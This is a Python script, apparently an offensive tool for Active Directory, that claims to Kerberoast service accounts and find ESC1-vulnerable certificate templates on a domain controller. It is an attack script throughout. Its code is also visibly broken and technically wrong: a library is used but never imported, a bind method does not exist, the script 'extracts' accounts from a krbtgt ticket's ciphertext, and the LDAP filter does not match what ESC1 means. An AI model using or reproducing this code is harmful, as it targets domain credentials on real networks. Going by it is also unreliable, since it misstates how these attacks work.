from impacket.smbconnection import SMBConnection
from impacket.krb5 import constants
from impacket.krb5.asn1 import AP_REQ, TGS_REQ
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.ntlm import compute_lmhash, compute_nthash

def kerberos_auth(username, password, domain, dc_ip):
    try:
        # Create a connection to the domain controller
        server = ldap3.Server(dc_ip, port=389)
        conn = ldap3.Connection(server, user=f"{username}@{domain}", password=password)
        conn.open()

        # Perform Kerberos authentication
        conn.bind()
        if conn.bound:
            print("Kerberos authentication successful.")
            return conn
        else:
            print("Kerberos authentication failed.")
            return None

    except Exception as e:
        print(f"Error during Kerberos authentication: {e}")
        return None

def kerberoast(domain, username, password, dc_ip):
    try:
        conn = kerberos_auth(username, password, domain, dc_ip)
        if conn:
            print(f"Attempting to Kerberoast accounts from {dc_ip}")

            target = Principal(f'krbtgt/{domain}', type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            krbtgt_ticket = get_ticket(username, password, domain, target, dc_ip, conn)
            
            if krbtgt_ticket:
                print("Successfully obtained krbtgt ticket.")
                
                # Extract usernames of kerberoastable accounts from the TGT
                kerberoastable_accounts = extract_kerberoastable_accounts(krbtgt_ticket)
                if kerberoastable_accounts:
                    print("Kerberoastable Accounts:")
                    for account in kerberoastable_accounts:
                        print(account)
                else:
                    print("No kerberoastable accounts found.")
            else:
                print("Failed to obtain krbtgt ticket.")

    except Exception as e:
        print(f"Error while Kerberoasting: {e}")

def get_ticket(username, password, domain, target, dc_ip, conn):
    try:
        # Get TGT ticket
        ccache = conn.sasl_gssapi_bind()
        creds = ccache.credentials[0]

        # Create AP-REQ message
        ap_req = AP_REQ()
        ap_req['pvno'] = 5
        ap_req['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
        ap_req['ap-options'] = 0
        ap_req['ticket'] = creds.ticket
        ap_req['authenticator'] = creds.ticket.authenticator

        # Send TGS request for krbtgt ticket
        tgs_req = TGS_REQ()
        tgs_req['pvno'] = 5
        tgs_req['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgs_req['padata'] = []
        tgs_req['req-body'] = {
            'kdc-options': 8,  # canonicalize
            'sname': target,
            'realm': domain,
            'till': KerberosTime(0),
            'etype': [23, 17, 18],  # RC4_HMAC, AES256, AES128
        }
        tgs_req['req-body']['cname'] = creds.ticket['cname']

        conn.request(target, tgs_req)
        response = conn.response
        if response and len(response) > 0:
            ticket = Ticket()
            ticket.from_asn1(response[0]['response']['ticket'])
            return ticket
        else:
            return None

    except Exception as e:
        print(f"Error while getting krbtgt ticket: {e}")
        return None

def extract_kerberoastable_accounts(tgt):
    try:
        kerberoastable_accounts = []

        for ticket in tgt['enc-part']['cipher'].tickets:
            sname = str(ticket['sname'])
            if sname.startswith('service'):
                service_name = sname.split('/')[1].split('@')[0]
                kerberoastable_accounts.append(service_name)

        return kerberoastable_accounts

    except Exception as e:
        print(f"Error while extracting kerberoastable accounts: {e}")
        return []

def find_esc1_certificate_templates(username, password, domain, dc_ip):
    try:
        conn = kerberos_auth(username, password, domain, dc_ip)
        if conn:
            print(f"Searching for ESC1 certificate templates on {dc_ip}")

            search_base = 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,' + ','.join(f"DC={dc}" for dc in domain.split('.'))
            search_filter = '(&(objectClass=pKICertificateTemplate)(!(name=DomainControllerAuthentication))(objectCategory=CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration)(msPKI-Certificate-Template-OID=1.3.6.1.4.1.311.21.8.11141852.2904762.4056951.8883555.2409484.547.1.2))'
            attributes = ['displayName']
            
            conn.search(search_base=search_base,
                        search_filter=search_filter,
                        search_scope=ldap3.SUBTREE,
                        attributes=attributes)

            if conn.entries:
                print(f"ESC1 certificate templates found on {dc_ip} that meet the criteria:")
                for entry in conn.entries:
                    print(entry.displayName.value)
            else:
                print(f"No ESC1 certificate templates found on {dc_ip}.")

    except Exception as e:
        print(f"Error while searching for ESC1 certificate templates: {e}")

# Example usage:
username = input("Enter username: ")
password = input("Enter password: ")
domain = input("Enter domain: ")
dc_ip = input("Enter domain controller IP or hostname: ")

kerberoast(domain, username, password, dc_ip)
find_esc1_certificate_templates(username, password, domain, dc_ip)
